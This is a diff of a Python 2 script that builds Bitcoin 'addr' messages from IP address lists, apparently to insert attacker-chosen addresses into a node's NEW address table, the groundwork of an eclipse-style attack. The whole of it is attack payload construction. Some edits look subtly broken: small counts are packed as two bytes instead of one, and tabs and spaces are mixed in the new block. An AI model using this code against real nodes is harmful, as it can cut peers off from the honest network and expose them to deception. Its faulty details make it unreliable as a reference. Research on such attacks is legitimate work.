@@ -125,24 +125,27 @@ while 1:
 #print  count_hex
 #target_count = 253
 services = 1
-port = 1235
+default_port = 8333 
 
 payload = ""
 cnt = 0
-f = open("3356.txt", 'r')
+f = open("1299.txt", 'r')
 while True :
     line = f.readline()
     
     if not line :
         if cnt <= 252 :
             payload_final = ""
-            payload_final += struct.pack("b", cnt)
+            payload_final += struct.pack("H", cnt)
             payload_final += payload
             
         else :
             count_num = cnt
             count_hex = hex(count_num)
-            count_str = "fd" + count_hex[3] + count_hex[4] + '0' + count_hex[2]
+	    if len(count_hex) == 4 :
+	        count_str = "fd" + count_hex[2] + count_hex[3] + '00'
+            else :
+            	count_str = "fd" + count_hex[3] + count_hex[4] + '0' + count_hex[2]
             target_count = count_str.decode("hex")
             payload_final = ""
             payload_final += struct.pack("3s", target_count)
@@ -161,7 +164,8 @@ while True :
 
     timestamp = int(time.time())
 
-    ip_addr = line[0] # this ip_addr will be inserted into NEW table. 
+    addr_list = line[0].split('.') # this ip_addr will be inserted into NEW table.
+    ip_addr = addr_list[0] + '.' + addr_list[1] + '.' + addr_list[2] + '.' + '1' 
     print ip_addr
     stringIPaddr = '00000000000000000000ffff' + convertToHex(ip_addr)
     targetIP = stringIPaddr.decode("hex")
@@ -169,7 +173,7 @@ while True :
     payload += struct.pack("I", timestamp)
     payload += struct.pack("Q", services)
     payload += struct.pack(">16s", targetIP)
-    payload += struct.pack(">H", port)
+    payload += struct.pack(">H", default_port)
     if cnt == 1000 :
         count_num = 1000
         count_hex = hex(count_num)
